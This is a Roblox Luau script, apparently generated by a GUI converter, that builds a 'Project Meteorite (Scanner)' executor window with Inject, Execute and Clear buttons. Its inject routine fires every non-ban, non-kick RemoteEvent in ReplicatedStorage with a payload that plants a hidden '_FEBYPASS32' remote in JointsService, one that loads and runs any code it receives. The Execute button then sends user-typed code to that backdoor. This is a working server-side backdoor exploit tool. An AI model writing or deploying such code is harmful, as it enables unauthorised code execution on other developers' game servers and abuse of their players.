--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @Rxs
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
]=]

local CollectionService = game:GetService("CollectionService")
local Players = game:GetService("Players")

local G2L = {}

G2L["ScreenGui_1"] = Instance.new("ScreenGui")
G2L["ScreenGui_1"].ZIndexBehavior = Enum.ZIndexBehavior.Sibling
G2L["ScreenGui_1"].Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
CollectionService:AddTag(G2L["ScreenGui_1"], "main")

G2L["Frame_2"] = Instance.new("Frame", G2L["ScreenGui_1"])
G2L["Frame_2"].BorderSizePixel = 0
G2L["Frame_2"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["Frame_2"].Size = UDim2.new(0.31406, 0, 0.2965, 0)
G2L["Frame_2"].Position = UDim2.new(0.27344, 0, 0.15364, 0)
G2L["Frame_2"].Active = true
G2L["Frame_2"].Draggable = true

Instance.new("UICorner", G2L["Frame_2"])

local gradient = Instance.new("UIGradient", G2L["Frame_2"])
gradient.Color = ColorSequence.new{
	ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255))
}

G2L["Title_6"] = Instance.new("TextLabel", G2L["Frame_2"])
G2L["Title_6"].BorderSizePixel = 0
G2L["Title_6"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["Title_6"].TextColor3 = Color3.fromRGB(255, 255, 255)
G2L["Title_6"].BackgroundTransparency = 1
G2L["Title_6"].Size = UDim2.new(0.33831, 0, 0.10909, 0)
G2L["Title_6"].Text = "Project Meteorite (Scanner)"
G2L["Title_6"].Name = "Title"

G2L["ScrollingFrame_7"] = Instance.new("ScrollingFrame", G2L["Frame_2"])
G2L["ScrollingFrame_7"].BorderSizePixel = 0
G2L["ScrollingFrame_7"].CanvasPosition = Vector2.new(0, 0)
G2L["ScrollingFrame_7"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["ScrollingFrame_7"].Size = UDim2.new(0.25373, 0, 0.77273, 0)
G2L["ScrollingFrame_7"].Position = UDim2.new(0.04975, 0, 0.13636, 0)

G2L["destruct_8"] = Instance.new("TextButton", G2L["ScrollingFrame_7"])
G2L["destruct_8"].BorderSizePixel = 0
G2L["destruct_8"].TextColor3 = Color3.fromRGB(255, 255, 255)
G2L["destruct_8"].BackgroundColor3 = Color3.fromRGB(0, 0, 0)
G2L["destruct_8"].Size = UDim2.new(0, 70, 0, 28)
G2L["destruct_8"].Text = "Soon..."
G2L["destruct_8"].Name = "destruct"
G2L["destruct_8"].Position = UDim2.new(0.21569, 0, 0.09412, 0)

Instance.new("UICorner", G2L["destruct_8"])
Instance.new("UICorner", G2L["ScrollingFrame_7"])

G2L["TextBox_b"] = Instance.new("TextBox", G2L["Frame_2"])
G2L["TextBox_b"].BorderSizePixel = 0
G2L["TextBox_b"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["TextBox_b"].PlaceholderText = "Scripts here..."
G2L["TextBox_b"].Size = UDim2.new(0.47264, 0, 0.76364, 0)
G2L["TextBox_b"].Position = UDim2.new(0.33333, 0, 0.13636, 0)
G2L["TextBox_b"].Text = ""

G2L["Execute_c"] = Instance.new("TextButton", G2L["Frame_2"])
G2L["Execute_c"].BorderSizePixel = 0
G2L["Execute_c"].BackgroundColor3 = Color3.fromRGB(16, 255, 0)
G2L["Execute_c"].Size = UDim2.new(0.15423, 0, 0.24545, 0)
G2L["Execute_c"].Text = "Execute"
G2L["Execute_c"].Name = "Execute"
G2L["Execute_c"].Position = UDim2.new(0.82587, 0, 0.13636, 0)

G2L["Clear_e"] = Instance.new("TextButton", G2L["Frame_2"])
G2L["Clear_e"].BorderSizePixel = 0
G2L["Clear_e"].BackgroundColor3 = Color3.fromRGB(255, 0, 0)
G2L["Clear_e"].Size = UDim2.new(0.15423, 0, 0.25455, 0)
G2L["Clear_e"].Text = "Clear"
G2L["Clear_e"].Name = "Clear"
G2L["Clear_e"].Position = UDim2.new(0.82587, 0, 0.39091, 0)

G2L["Inject_10"] = Instance.new("TextButton", G2L["Frame_2"])
G2L["Inject_10"].BorderSizePixel = 0
G2L["Inject_10"].BackgroundColor3 = Color3.fromRGB(116, 116, 116)
G2L["Inject_10"].Size = UDim2.new(0.15423, 0, 0.23636, 0)
G2L["Inject_10"].Text = "Inject"
G2L["Inject_10"].Name = "Inject"
G2L["Inject_10"].Position = UDim2.new(0.82587, 0, 0.66364, 0)

G2L["Status_12"] = Instance.new("TextLabel", G2L["Frame_2"])
G2L["Status_12"].BorderSizePixel = 0
G2L["Status_12"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["Status_12"].TextColor3 = Color3.fromRGB(255, 0, 0)
G2L["Status_12"].BackgroundTransparency = 1
G2L["Status_12"].Size = UDim2.new(0.22388, 0, 0.1, 0)
G2L["Status_12"].Text = "Not Injected!"
G2L["Status_12"].Name = "Status"
G2L["Status_12"].Position = UDim2.new(0.75124, 0, 0.00909, 0)

G2L["Injected?_13"] = Instance.new("BoolValue", G2L["Status_12"])
G2L["Injected?_13"].Name = "Injected?"

G2L["UIAspectRatioConstraint_14"] = Instance.new("UIAspectRatioConstraint", G2L["Frame_2"])
G2L["UIAspectRatioConstraint_14"].AspectRatio = 1.82727

local function InjectBackdoor()
	local function search(folder)
		local function inject(remote)
			remote:FireServer([[
				local folder = Instance.new('RemoteEvent')
				folder.Name = "_FEBYPASS32"
				folder.Parent = game:GetService("JointsService")
				local loadstring = require(13684410229)
				folder.OnServerEvent:Connect(function(_1,_2)
					loadstring(_2)()
				end)
			]])
		end
		for _, v in pairs(folder:GetChildren()) do
			if v:IsA("RemoteEvent") then
				if not string.match(string.lower(v.Name), "ban") and not string.match(string.lower(v.Name), "kick") then
					inject(v)
				end
			end
			search(v)
		end
	end
	search(game:GetService("ReplicatedStorage"))
	local t, max = 0, 5
	repeat wait(0.1) t += 0.1 until game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") or t >= max
	if game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") then
		G2L["Status_12"].Text = "Injected!"
		G2L["Status_12"].TextColor3 = Color3.fromRGB(0, 255, 0)
	else
		G2L["Status_12"].Text = "Not Injected!"
		G2L["Status_12"].TextColor3 = Color3.fromRGB(255, 0, 0)
	end
end

G2L["Inject_10"].MouseButton1Click:Connect(InjectBackdoor)

G2L["Execute_c"].MouseButton1Click:Connect(function()
	local remote = game:GetService("JointsService"):FindFirstChild("_FEBYPASS32")
	if remote then
		remote:FireServer(G2L["TextBox_b"].Text)
	end
end)

G2L["Clear_e"].MouseButton1Click:Connect(function()
	G2L["TextBox_b"].Text = ""
end)

return G2L["ScreenGui_1"]
